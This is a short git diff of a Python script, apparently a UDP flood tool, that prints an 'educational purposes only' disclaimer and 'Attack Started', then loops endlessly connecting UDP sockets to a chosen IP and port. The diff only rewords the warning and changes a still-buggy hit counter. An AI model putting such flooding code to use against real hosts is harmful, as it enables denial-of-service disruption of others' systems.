@@ -3,7 +3,7 @@ import os
 import sys
 os.system("clear")
 print
-print("Warning!!!! This Script is no joke and it is for educational purposes only, I'm not responsible for any damage caused by this script")
+print("Warning!!!! This Script is not joke and it is for educational purposes only, I'm not responsible for any damage caused by this script")
 
 print("To insert the default port write 0")
 
@@ -19,7 +19,8 @@ print("Attack Started ☢️")
 print("Use CTRL+C to stop the Attack")
 while True:
    h = 1
-   print("Total Hits --> ", h+1)
+   th = h+1
+   print("Total Hits --> ", th+1)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
    s.connect((ip, port))
